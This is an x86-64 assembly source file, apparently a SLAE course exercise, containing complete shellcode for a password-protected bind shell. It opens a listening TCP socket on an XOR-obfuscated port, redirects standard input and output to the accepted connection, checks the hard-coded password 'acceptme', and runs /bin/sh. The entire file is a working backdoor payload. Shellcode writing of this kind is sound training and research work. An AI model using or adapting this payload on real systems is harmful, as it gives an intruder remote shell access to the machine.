; Filename: BindShell-Skeleton.nasm
; Author  : Andrea Perfetti
; SLAE ID : PA-29059

global _start

_start:
	; socket()
	push byte +0x29
	pop rax
	cdq
	push byte +0x2
	pop rdi
	push byte +0x1
	pop rsi
	syscall

	; bind()
	xchg rax,rdi
	push rdx

	xor rbx, rbx
	mov ebx, 0x1ce9fffd
	xor ebx, 0xffffffff
	mov dword [rsp], ebx
	mov rsi,rsp
	push byte +0x10
	pop rdx
	push byte +0x31
	pop rax
	syscall

	; listen()
	xor rax, rax
	add rax, 0x32
	xor rsi, rsi
	syscall

	; accept()
	xor rsi,rsi
	push byte +0x2b
	pop rax
	syscall

dup2:
	xchg rax,rdi
	push byte +0x3
	pop rsi
dup2loop:
	dec rsi
	push byte +0x21
	pop rax
	syscall
	jnz dup2loop

pwd_check:
	; password:  acceptme

	xor rax, rax 		; __NR_read = 0x0

	push rax
	mov rsi, rsp		; rsi = [rsp] (char __user * buf)

	xor rdx, rdx
	add rdx, 0x8 		; rdx = 0x8 (size_t count)

	syscall

	mov rbx, 0x656d747065636361
	cmp rbx, [rsi]         
	jnz exit_pwderror

execve:
	xor rax, rax
    push rax

    mov rbx, 0x68732f2f6e69622f
    push rbx

    mov rdi, rsp
    push rax

    mov rdx, rsp

    push rdi

    mov rsi, rsp

    add rax, 59
    syscall
	
	jmp short exit_catch		; Catch errors. Should never be reached!

exit_pwderror:						; exit(6)
	xor rax, rax
	add rax, 0x3c
	xor rdi, rdi
	add rdi, 0x6
	syscall			
 
exit_catch:							; exit(15) - Used to catch errors in the execve()
	xor rax, rax
	add rax, 0x3c
	xor rdi, rdi
	add rdi, 0xF
	syscall		
